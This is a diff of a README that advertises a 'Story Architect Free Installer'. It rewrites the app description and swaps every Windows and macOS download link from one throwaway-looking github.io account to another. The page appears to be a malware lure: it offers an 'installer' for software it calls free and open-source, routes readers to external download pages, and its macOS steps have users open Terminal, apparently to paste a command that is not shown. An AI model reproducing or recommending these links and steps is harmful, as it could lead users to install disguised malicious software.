@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Story+Planning-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Story Architect Free Installer** — Story Architect is a story development and planning application for writers that combines outlining, character development, and scene management in one tool. Works without internet access, no account required. Full offline installation.
+**💻 Story Architect Free Installer** — Story Architect is a free, open-source visual story planning tool for Linux, Windows, and macOS. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Story Architect](https://img.shields.io/badge/⬇_Install_Story+Architect-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Story Architect](https://img.shields.io/badge/⬇_Install_Story+Architect-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Story Architect
 
-Story Architect is a story development and planning application for writers that combines outlining, character development, and scene management in one tool. Build story structures using proven narrative frameworks, develop character arcs, and track story threads across multiple drafts. Story Architect bridges the gap between idea generation and the actual writing process.
+Story Architect is a free, open-source visual story planning tool for Linux, Windows, and macOS. It provides a canvas-based outlining interface with cards, text documents, and mind maps — offering a flexible workspace for developing stories before drafting.
 
 ---
 
 ## ❌ Problem: Story Architect is hard to access
 
-- **Platform Availability** — Available on select platforms with potential gaps
-- **Learning Investment** — Narrative framework concepts require time to internalize
-- **Integration** — Limited direct export to popular writing applications
-- **Community Size** — Smaller user base than established writing tools
+- **Early Development** — Some features still under active development
+- **Limited Documentation** — Help resources sparse compared to commercial alternatives
+- **No Writing Mode** — Planning tool only; requires a separate application for drafting
+- **Small Community** — Limited templates and user resources available
 
 ---
 
@@ -61,9 +61,9 @@ Story Architect is a story development and planning application for writers that
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ Story Architect is a story development and planning application for writers that
 
 <div align="center">
 
-[![⬇ Install Story Architect](https://img.shields.io/badge/⬇_Install_Story+Architect-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Story Architect](https://img.shields.io/badge/⬇_Install_Story+Architect-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ Story Architect is a story development and planning application for writers that
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ Story Architect is a story development and planning application for writers that
 
 ---
 
-**Story Architect Free Installer** — Story Architect is a story development and planning application for writers that combines outlining, character development, and scene management in one tool. Install without internet connection today!
+**Story Architect Free Installer** — Story Architect is a free, open-source visual story planning tool for Linux, Windows, and macOS. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Story Architect](https://img.shields.io/badge/⬇_Install_Story+Architect-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Story Architect](https://img.shields.io/badge/⬇_Install_Story+Architect-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
